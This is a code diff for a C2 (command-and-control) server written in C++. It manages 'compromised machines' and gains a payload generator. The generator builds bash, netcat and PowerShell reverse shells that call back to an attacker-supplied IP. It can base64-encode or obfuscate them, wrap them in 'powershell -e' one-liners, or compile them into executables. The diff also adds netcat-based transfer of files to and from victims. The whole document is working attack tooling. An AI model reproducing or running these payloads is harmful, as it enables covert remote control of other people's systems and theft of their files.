@@ -13,7 +13,7 @@ const std::string base64_chars =
 
 // global buffer used to store received data from shell sessions
 // to later display on terminal
-size_t BUFFER_SIZE = 4096*4;
+size_t BUFFER_SIZE = 10000000; // buffer size of estimated 10MB
 std::vector<char> buffer(BUFFER_SIZE);
 
 // current socket we are interacting with
@@ -38,11 +38,11 @@ void scriptCliCmd(std::string);
 // Extra Components
 void BackgroundConnectionHandler();
 void ShellInteraction();
-std::string base64_encode(const std::string&);
 void fetchInterfaceIPs();
 void HandleServer();
 void BackgroundInitListener();
 int ShellCheck();
+std::string base64_encode(const std::string&);
 
 int main()
 {
@@ -102,16 +102,17 @@ int main()
 
 void c2_cmd(std::string cmd)
 {
-    if (cmd == "shutdown") { serverShutDown = true; return; }
+    if (cmd == "shutdown" || cmd == "exit") { serverShutDown = true; return; }
 
     if (cmd == "help")
     {
         std::cout << "------ COMMANDS ------" << "\n";
-        std::cout << "shutdown ---- Exit c2 program" << "\n";
-        std::cout << "help -------- Show this page" << "\n";
-        std::cout << "devices ----- Display compromised machines" << "\n";
-        std::cout << "server ------ Display C2 Server Info" << "\n";
-        std::cout << "script ------ Create shell executables" << "\n";
+        std::cout << "shutdown ------- Exit c2 program" << "\n";
+        std::cout << "help ----------- Show this page" << "\n";
+        std::cout << "devices -------- Display compromised machines" << "\n";
+        std::cout << "server --------- Display C2 Server Info" << "\n";
+        std::cout << "script --------- Create shell executables" << "\n";
+        std::cout << "help <option> -- Get Help about an Option" << "\n";
         //std::cout << "" << "\n";
         std::cout << "----------------------" << "\n";
         std::cout << "\n";
@@ -123,6 +124,7 @@ void c2_cmd(std::string cmd)
         std::cout << "NO ARG - display compromised machines" << "\n";
         std::cout << "-i ----- interact with indexed machine" << "\n";
         std::cout << "-d ----- disconnect indexed machine" << "\n";
+        std::cout << "-D ----- disconnect all sessions" << "\n";
         std::cout << "\n";
         return;
     }
@@ -240,8 +242,21 @@ void c2_cmd(std::string cmd)
             {
                 std::cout << "[-] Invalid Shell Index!" << "\n";
                 shellIndex = -1;
-                return;
             }
+
+        return;
+    }
+
+    if (cmd == "devices -D")
+    {
+        std::cout << "[*] Removing All Sessions. . .\n";
+        for (size_t i = 0; i < sessions.size(); ++i)
+        {
+            close(sessions[i].GetSocket());
+        }
+        std::cout << "[*] All Sessions Cleared!\n";
+
+        return;
     }
 
     // Enter an interactive shell session
@@ -307,24 +322,32 @@ void scriptCliCmd(std::string cmd)
 
     // capture the rest of the string if we end with -r
     parsedFlags.push_back( cmd.substr(start) );
-
+/*
     for (size_t i = 0; i < parsedFlags.size(); ++i)
     {
         std::cout << i << " :: '" << parsedFlags[i] << "'\n";
     }
     std::cout << "\n";
+*/
 
     std::string fileName_;
     bool obf_ = false;
     bool enc_ = false;
     bool raw_ = false;
-    std::string targetOS_ = "linux";
-    std::string shellType_ = "bash";
+    bool ipEntered = false;
+    std::string targetOS_ = "";
+    std::string shellType_ = "";
 
     // Run through the parse collection and perform logic
     for (size_t i = 0; i < parsedFlags.size(); ++i)
     {
         std::string flag_ = parsedFlags[i];
+
+        if (flag_ == " " || flag_ == "\t" || flag_ == "\r")
+        {
+            // ignore accidental whitespaces
+            continue;
+        }
 
         if (flag_ == "-os")
         {
@@ -332,8 +355,8 @@ void scriptCliCmd(std::string cmd)
             {
                 if (parsedFlags[i+1] == "linux" || parsedFlags[i+1] == "windows")
                 {
-                    if (targetOS_ != "") std::cout << "[-] Bad Command Input! :: Duplicate -os flags" << "\n";
-                    targetOS_ = parsedFlags[i+1];
+                    targetOS_ = parsedFlags[++i];
+                    continue;
                 } else
                     {
                         std::cout << "[-] Invalid OS Target! :: -os takes 1 parameter linux/windows" << "\n";
@@ -350,32 +373,42 @@ void scriptCliCmd(std::string cmd)
         {
             if (i+1 < parsedFlags.size())
             {
-                if (parsedFlags[i+1] == "base64")
+                if (parsedFlags[++i] == "base64")
                 {
                     if (!enc_)
+                    {
                         enc_ = true;
-                    else
-                        std::cout << "[-] Bad Command Input! :: Duplicate -e flags" << "\n";
+                        continue;
+                    } else
+                        {
+                            std::cout << "[-] Bad Command Input! :: Duplicate -e flags" << "\n";
+                        }
                 } else
                     {
                         std::cout << "[-] Bad Command Input! :: -e takes one parameter [base64]" << "\n";
+                        return;
                     }
             } else
                 {
                     // default set
                     if (!enc_)
+                    {
                         enc_ = true;
-                    else
-                        std::cout << "[-] Bad Command Input! :: Duplicate -e flags" << "\n";
+                        continue;
+                    } else
+                        {
+                            std::cout << "[-] Bad Command Input! :: Duplicate -e flags" << "\n";
+                        }
                 }
         }
 
-        if (flag_ == "-O")
+        if (flag_ == "-O" || flag_ == "-o") // execption flag param for usage
         {
             if (i+1 < parsedFlags.size())
             {
                 if (fileName_ != "") std::cout << "[-] Bad Command Input! :: Duplicate -O flags" << "\n";
-                fileName_ = parsedFlags[i+1];
+                fileName_ = parsedFlags[++i];
+                continue;
             } else
                 {
                     std::cout << "[-] Bad Command Input! :: -O takes 1 parameter [outfile name]" << "\n";
@@ -392,9 +425,14 @@ void scriptCliCmd(std::string cmd)
             }
 
             if (!raw_)
+            {
                 raw_ = true;
-            else
-                std::cout << "[-] Bad Command Input! :: Duplicate -r flags" << "\n";
+                continue;
+            } else
+                {
+                    std::cout << "[-] Bad Command Input! :: Duplicate -r flags" << "\n";
+                    return;
+                }
         }
 
         if (flag_ == "-obf")
@@ -429,24 +467,51 @@ void scriptCliCmd(std::string cmd)
         {
             if (i+1 < parsedFlags.size())
             {
-                std::string nextFlag_ = parsedFlags[i+1];
+                std::string nextFlag_ = parsedFlags[++i];
 
-                if (nextFlag_ != "bash" || nextFlag_ != "sh" || nextFlag_ != "nc")
+                if (nextFlag_ != "bash" && nextFlag_ != "sh" && nextFlag_ != "nc"
+                    && nextFlag_ != "powershell" && nextFlag_ != "pwsh" && nextFlag_ != "cmd")
                 {
-                    std::cout << "[-] Bad Command Input! :: -shell takes one parameter [bash/sh/nc]" << "\n";
+                    std::cout << "[-] Bad Command Input! :: -shell takes one parameter [bash/sh/nc/powershell/pwsh/cmd]" << "\n";
                     return;
                 }
 
                 shellType_ = nextFlag_;
+                continue;
             }
         }
 
         if (flag_ == "-ip")
         {
-            LHOST = flag_;
+            if (i+1 < parsedFlags.size())
+            {
+                LHOST = parsedFlags[++i];
+                ipEntered = true;
+                continue;
+            }
+
+            std::cout << "[-] Bad Command Input! :: -ip takes one parameter [IPv4]" << "\n";
+            return;
         }
 
+        std::cout << "[-] Bad Flag Detected! Run help to see the help-page\n";
+        return;
+
     }// End Of Parse Scanning
+
+    if (fileName_ != "" && !ipEntered)
+    {
+        std::cout << "[-] Command must include -ip when using -O!\n";
+        std::cout << "Enter help to view the help-screen!\n";
+        return;
+    }
+
+    if (shellType_ == "" || targetOS_ == "")
+    {
+        std::cout << "[-] Command must include -os and -shell!\n";
+        std::cout << "Enter help to view the help-screen!\n";
+        return;
+    }
 
     createShellScript(targetOS_, obf_, enc_, raw_, fileName_, shellType_);
 };
@@ -456,19 +521,32 @@ void createShellScript(std::string targetOS, bool obf, bool enc, bool raw, std::
     std::string codeContent;
     std::ofstream shellScript_;
     
-    if (!raw)
+    if (!raw && targetOS == "linux" && fileName != "")
     {
         // ready a new file to build if raw is false
-        shellScript_.open(fileName);
+        shellScript_.open(fileName + ".cpp");
     }
 
     // write content --> shellScript_ << "Writing this to a file.\n";
     if (targetOS == "windows")
     {
         // Windows Shell Code
-        std::cout << "[*] Development in Progress. . ." << "\n";
-        shellScript_.close();
-        return;
+        // std::cout << "[*] Development in Progress. . ." << "\n";
+
+        if (shellType == "powershell" || shellType == "pwsh" || shellType == "cmd")
+        {
+            codeContent = "$client = New-Object System.Net.Sockets.TCPClient('" + LHOST;
+            codeContent += "'," + std::to_string(LPORT) + ");$stream = $client.GetStream();";
+            codeContent += "[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)";
+            codeContent += "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);";
+            codeContent += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';";
+            codeContent += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);";
+            codeContent += "$stream.Flush()};$client.Close()";
+        } else
+            {
+                std::cout << "[-] Bad Shell Type! '-os windows -shell' only accepts [powershell/pwsh/cmd]\n";
+                return;
+            }
     } else
         {
             // Linux Shell Code
@@ -476,19 +554,20 @@ void createShellScript(std::string targetOS, bool obf, bool enc, bool raw, std::
             {
                 codeContent += "/bin/bash -c '/bin/bash -i >& /dev/tcp/";
                 codeContent += LHOST + "/" + std::to_string(LPORT) + " 0>&1'";
-            }
-
-            if (shellType == "sh")
-            {
-                codeContent += "/bin/bash -c '/usr/bin/sh -i >& /dev/tcp/";
-                codeContent += LHOST + "/" + std::to_string(LPORT) + " 0>&1'";
-            }
-
-            if (shellType == "nc")
-            {
-                codeContent += "/usr/bin/nc -e /bin/sh ";
-                codeContent += LHOST + " " + std::to_string(LPORT);
-            }
+            } else if (shellType == "sh")
+                {
+                    codeContent += "/bin/bash -c '/usr/bin/sh -i >& /dev/tcp/";
+                    codeContent += LHOST + "/" + std::to_string(LPORT) + " 0>&1'";
+                } else if (shellType == "nc")
+                    {
+                        codeContent += "/usr/bin/nc -e /bin/bash ";
+                        codeContent += LHOST + " " + std::to_string(LPORT);
+                    } else
+                        {
+                            std::cout << "[-] Bad Shell Type! '-os linux -shell' only accepts [bash/sh/nc]\n";
+                            shellScript_.close();
+                            return;
+                        }
 
             if (obf)
             {
@@ -501,34 +580,153 @@ void createShellScript(std::string targetOS, bool obf, bool enc, bool raw, std::
                 std::string encoded = base64_encode(codeContent);
                 codeContent = "echo -n '" + encoded + "'|base64 -d|/bin/bash";
             }
+        }
 
-            if (raw)
+    if (raw)                
+    {                                                                                                                                               
+        // print to screen and dont build file                                                                                                      
+        if (targetOS == "linux")
+        {
+            std::cout << "[+] Sh3LL_SCR1PT :: " << codeContent << "\n\n";
+        } else
             {
-                // print to screen and dont build file
-                std::cout << "[+] Sh3LL_SCR1PT :: " << codeContent << "\n\n";
+                // python3 to print out the codeContent
+                if (enc)
+                {
+                    // advantage of python3s usefulness (powershell -e [UTF16LE base64 string])
+                    // the python3 code will handle the base64 encoding and handle file making
+                    // and printing to screen
+
+                    std::string pythonOneLiner = "/usr/bin/python3 -c ";
+                    pythonOneLiner += "\"import base64; encodeShell = '" + base64_encode(codeContent);
+                    pythonOneLiner += "'; shellEncBytes = encodeShell.encode('ascii'); shellCodeBytes = base64.b64decode(shellEncBytes);";
+                    pythonOneLiner += "shellString = shellCodeBytes.decode('ascii'); tStr = shellString;";
+                    pythonOneLiner += "b64Bytes = base64.b64encode(tStr.encode('UTF-16LE')); b64String = b64Bytes.decode('ascii');";
+                    
+                    if (shellType != "cmd")
+                    {
+                        pythonOneLiner += "print(f'[+] Sh3LL_SCR1PT :: powershell -e {b64String}')\"";
+                    } else
+                        {
+                            pythonOneLiner += "print(f'[+] Sh3LL_SCR1PT :: cmd /c powershell -e {b64String}')\"";
+                        }
+
+                    system(pythonOneLiner.c_str());
+                } else
+                    {
+                        // write plain text to screen
+
+                        if (shellType != "cmd")
+                        {
+                            std::cout << "[+] Sh3LL_SCR1PT :: powershell -nop -c \"" << codeContent << "\"\n";
+                        } else
+                            {
+                                std::cout << "[+] Sh3LL_SCR1PT :: cmd /c powershell -nop -c \"";
+                                std::cout << codeContent << "\"\n";
+                            }
+                    }
+            }
+    } else
+        {
+            if (targetOS == "linux")
+            {
+                // build the file for linux shell code
+                std::string fileCapsule;
+                fileCapsule += "#include <iostream>\n#include <cstdlib>\n";
+                fileCapsule += "int main()\n{\n";
+                fileCapsule += "    system(\"" + codeContent + "\");";
+                fileCapsule += "\n}";
+                shellScript_ << fileCapsule;
+                shellScript_.close();
+
+                std::string buildCmd = "clang++ -g -Werror -W -Wunused -Wuninitialized -Wshadow -std=c++17 ";
+                buildCmd += fileName + ".cpp -o " + fileName + ".out";
+
+                if (system(buildCmd.c_str()) != 0)
+                {
+                    std::cout << "[-] Error has Occured building shell executable!" << "\n";
+                    return;
+                };
+                
+                std::cout << "[+] Created " << fileName << ".cpp/out successfully!\n";
             } else
                 {
-                    // build the file
-                    std::string fileCapsule;
-                    fileCapsule += "#include <iostream>\n#include <string>\n#include <cstdlib>\n";
-                    fileCapsule += "int main(){\n";
-                    fileCapsule += "system(\"" + codeContent + "\");";
-                    fileCapsule += "}";
+                    // use python3 again to create a new file
+                    std::string pythonFileMake = "/usr/bin/python3 -c \""
+                        "shellFile = open('" + fileName + ".cpp', 'w');"
+                        " shellFile.write('#include <string>\\n#include <cstdlib>\\nint main()\\n{\\n');";
 
-                    shellScript_ << fileCapsule;
-                    shellScript_.close();
+                    if (enc)
+                    {
+                        // write encoded text
+                        pythonFileMake += "import base64; encodeShell = '" + base64_encode(codeContent);
+                        pythonFileMake += "'; shellEncBytes = encodeShell.encode('ascii'); shellCodeBytes = base64.b64decode(shellEncBytes);";
+                        pythonFileMake += "shellString = shellCodeBytes.decode('ascii'); tStr = shellString;";
+                        pythonFileMake += "b64Bytes = base64.b64encode(tStr.encode('UTF-16LE')); b64String = b64Bytes.decode('ascii');";
+
+                        pythonFileMake += " shellFile.write('    std::string cmd = ' + f\'\\\"";
+
+                        if (shellType != "cmd")
+                        {
+                            pythonFileMake += "powershell -e {b64String}";
+                        } else
+                            {
+                                pythonFileMake += "cmd /c powershell -e {b64String}";
+                            }
+                    } else
+                        {
+                            // write plain text
+
+                            pythonFileMake += "import base64; encodeShell = '" + base64_encode(codeContent);
+                            pythonFileMake += "'; shellEncBytes = encodeShell.encode('ascii'); shellCodeBytes = base64.b64decode(shellEncBytes);";
+                            pythonFileMake += "shellString = shellCodeBytes.decode('ascii');";
+
+                            pythonFileMake += " shellFile.write('    std::string cmd = \\\"";
+
+                            // write plain text
+                            if (shellType != "cmd")
+                            {
+                                pythonFileMake += "powershell -nop -c \\\\\\\\\\\\\\\"' + shellString + '\\\\\\\\\\\\\\\"";
+                            } else
+                                {
+                                    pythonFileMake += "cmd /c powershell -nop -c \\\\\\\\\\\\\\\"' + shellString + '\\\\\\\\\\\\\\\"";
+                                }
+                        }
+
+                    pythonFileMake += "\\\";');";
+                    pythonFileMake += " shellFile.write('\\n    system(cmd.c_str());\\n}');\"";
+                    
+                    // std::cout << "[*] Debug Python Command :: " << pythonFileMake << "\n";
+
+                    if (system(pythonFileMake.c_str()) != 0)
+                    {
+                        std::cout << "[-] Error with Python3 command!\n";
+                        std::cout << "[*] Python3 Command :: " << pythonFileMake << "\n";
+                        return;
+                    }
 
                     std::string buildCmd = "clang++ -g -Werror -W -Wunused -Wuninitialized -Wshadow -std=c++17 ";
-                    buildCmd += fileName + "-o " + fileName + ".out";
+                    buildCmd += fileName + ".cpp -o " + fileName + ".out";
 
                     if (system(buildCmd.c_str()) != 0)
                     {
                         std::cout << "[-] Error has Occured building shell executable!" << "\n";
+                        std::cout << "[*] Python3 Command :: " << pythonFileMake << "\n";
+                        return;
                     };
+
+                    std::cout << "[+] Created " << fileName << ".cpp/out successfully!\n";
                 }
         }
 
-    shellScript_.close();
+    if (shellType == "windows")
+    {
+        std::cout << "[*] WARNING! For Windows machines you may need to run\n";
+        std::cout << "Set-ExecutionPolicy Unrestricted -Scope CurrentUser\n";
+        std::cout << "to allow execution of some Programs!\n\n";
+        std::cout << "[*] NOTICE! These Windows Shell Payloads strictly execute\n";
+        std::cout << "successfully on systems with Minimum Security!\n";
+    }
 };
 
 /*
@@ -555,12 +753,16 @@ void ShellInteraction()
     {
         getline(std::cin, shellcmd);
 
-        if (shellcmd == "quit" || shellcmd == "exit") continue;
-/*
+        if (shellcmd == "quit" || shellcmd == "exit")
+        {
+            std::cout << "\n";
+            continue;
+        }
+
         if (shellcmd == "download")
         {
-            std::cout << "[-] download takes one parameter [filename from target]" << "\n";
-            return;
+            std::cout << "[-] download takes one parameter [filename on target]" << "\n";
+            continue;
         }
 
         if (shellcmd == "upload")
@@ -568,8 +770,6 @@ void ShellInteraction()
             std::cout << "[-] upload takes one parameter [local filename]" << "\n";
             return;
         }
-
-//===========================================================================
 
         // capture parameters for upload/download command
         std::vector<std::string> splitCommand;
@@ -584,92 +784,108 @@ void ShellInteraction()
             pos = shellcmd.find(" ", start);
         }
 
+        // ensure we capture all the command parts
+        splitCommand.push_back( shellcmd.substr(start) );
+
         // Download files from target to local
-        if (splitCommand[0] == "download")
+        if (splitCommand.size() > 0)
         {
-            // check if the file exists on the target
-            if (splitCommand.size() != 2)
+            // check the first piece of the parsed command
+            if (splitCommand[0] == "download")
             {
-                std::cout << "[-] download takes one parameter [filename on target]" << "\n";
-                return;
-            }
-
-            // set up download listener locally on random port
-            int randPort = std::rand() % 1000 + (LPORT + 2);
-
-            std::string localListenerCmd = "/user/bin/timeout 5 /usr/bin/nc -lp " + std::to_string(randPort);
-            localListenerCmd += " > " + splitCommand[1];
-
-            system(localListenerCmd.c_str());
-
-            // figure out what system we are uploading to
-            if (sessions[shellIndex].GetSocketOS() == "Linux")
-            {
-                // run system command to send a file through netcat
-                // on the target machine
-
-                shellcmd = "/usr/bin/nc " + LHOST + " " + std::to_string(randPort);
-                shellcmd += " < " + splitCommand[1];
-            } else // Windows
+                // check if the file exists on the target
+                if (splitCommand.size() != 2)
                 {
-                    // host the target file from the target system
-                    // windows powershell one-liner command:
-
-                    shellcmd = "Get-Content '" + splitCommand[1] + "' | ForEach-Object { ";
-                    shellcmd += "[System.Net.Sockets.TcpClient]::new('" + LHOST;
-                    shellcmd += "', " + std::to_string(randPort) + ")";
-                    shellcmd += ".GetStream().Write([System.Text.Encoding]::";
-                    shellcmd += "UTF8.GetBytes($_), 0, $_.Length) }";
+                    std::cout << "[-] download takes one parameter [filename on target]" << "\n";
+                    continue;
                 }
-        }
 
-//===========================================================================
+                // set up download listener locally on random port
+                int randPort = std::rand() % 1000 + (LPORT + 2);
 
-        // Download files from local to target
-        if (splitCommand[0] == "upload")
-        {
-            if (splitCommand.size() != 2)
-            {
-                std::cout << "[-] upload takes one parameter [local filename]" << "\n";
-                return;
-            }
+                std::string localListenerCmd = "(/usr/bin/timeout 10 /usr/bin/nc -lp " + std::to_string(randPort);
+                localListenerCmd += " > " + splitCommand[1] + ")& 2>/dev/null";
 
-            // check if the file exists locally
-            std::string checkStr = "file ";
-            checkStr += splitCommand[1];
+                system(localListenerCmd.c_str());
 
-            if ( system(checkStr.c_str()) != 0 )
-            {
-                std::cout << "[-] " << splitCommand[1] << " does not Exist in PWD!" << "\n";
-                return;
-            }
+                fetchInterfaceIPs();
+                std::string LISTENER_IP;
 
-            // use netcat to momentary host an instance of the file
-            // nc -lp PORT < FILE
+                std::cout << "Enter IP Address of Listener :: ";
+                std::cin >> LISTENER_IP;
 
-            // Establishing a File Share from local system
-            std::string hostFileCmd = "/usr/bin/nc -lp ";
-            
-            int randPort = std::rand() % 1000 + (LPORT + 2);
-            
-            hostFileCmd += std::to_string(randPort) + " < ";
-            hostFileCmd += splitCommand[1];
-
-            system(hostFileCmd.c_str());
-
-            // figure out what system we are uploading to
-            if (sessions[shellIndex].GetSocketOS() == "Linux")
-            {
-                shellcmd = "/usr/bin/curl http://" + LHOST + ":" + std::to_string(randPort);
-                shellcmd += "/" + splitCommand[1] + "-O " + splitCommand[1];
-            } else // Windows
+                // figure out what system we are downloading on
+                if (sessions[shellIndex].GetSocketOS() == "Linux")
                 {
-                    shellcmd = "Invoke-WebRequest http://" + LHOST + ":";
-                    shellcmd += std::to_string(randPort) + "/";
-                    shellcmd += splitCommand[1] + "-OutFile " + splitCommand[1];
+                    // run system command to send a file through netcat
+                    // on the target machine
+
+                    // nc IP PORT -q 0 < FILE makes it so when the data is
+                    // fully transfered the command ends automatically
+
+                    shellcmd = "/usr/bin/nc " + LISTENER_IP + " " + std::to_string(randPort);
+                    shellcmd += " -q 0 < " + splitCommand[1];
+                } else // Windows
+                    {
+                        // host the target file from the target system
+                        // windows powershell one-liner command:
+
+                        shellcmd = "Get-Content '" + splitCommand[1] + "' | ForEach-Object { ";
+                        shellcmd += "[System.Net.Sockets.TcpClient]::new('" + LISTENER_IP;
+                        shellcmd += "', " + std::to_string(randPort) + ")";
+                        shellcmd += ".GetStream().Write([System.Text.Encoding]::";
+                        shellcmd += "UTF8.GetBytes($_), 0, $_.Length) }";
+                    }
+                // No continue statement here because the command needs
+                // to be sent to our shell victim
+            }
+
+            if (splitCommand[0] == "upload")
+            {
+                // check if the file exists on the target
+                if (splitCommand.size() != 2)
+                {
+                    std::cout << "[-] upload takes one parameter [local filename]" << "\n";
+                    continue;
                 }
+
+                // check if file exists locally
+                std::ifstream localfile(splitCommand[1]);
+                if (!localfile.is_open())
+                {
+                    std::cout << "[-] " << splitCommand[1] << " Does Not Exist!" << "\n";
+                    continue;
+                }
+
+                fetchInterfaceIPs();
+                std::string LISTENER_IP;
+
+                std::cout << "Enter IP Address of Listener :: ";
+                std::cin >> LISTENER_IP;
+
+                // prepare file host locally
+                int randPort = std::rand() % 1000 + (LPORT + 2);
+
+                std::string localListenerCmd = "(/usr/bin/timeout 10 /usr/bin/nc -lp " + std::to_string(randPort);
+                localListenerCmd += " < " + splitCommand[1] + ")& 2>/dev/null";
+
+                system(localListenerCmd.c_str());
+
+                // figure out what system we are uploading to
+                if (sessions[shellIndex].GetSocketOS() == "Linux")
+                {
+                    shellcmd = "/usr/bin/nc " + LISTENER_IP + " " + std::to_string(randPort);
+                    shellcmd += " -q 0 > " + splitCommand[1];
+                } else // Windows
+                    {
+                        shellcmd = "Invoke-WebRequest http://" + LISTENER_IP;
+                        shellcmd += ":" + std::to_string(randPort) + "/";
+                        shellcmd += " -OutFile " + splitCommand[1];
+                    }
+
+                system("sleep 2 2>/dev/null");
+            }
         }
-*/
 
 //=========== SEND SHELL COMMAND ========================================
 
@@ -680,9 +896,7 @@ void ShellInteraction()
         bytes_sent = send(select_socket, command, strlen(command), 0);
         if (bytes_sent == -1)
         {
-            // perror("send");
             close(select_socket);
-            // close(server_socket);
             return;
         }
 
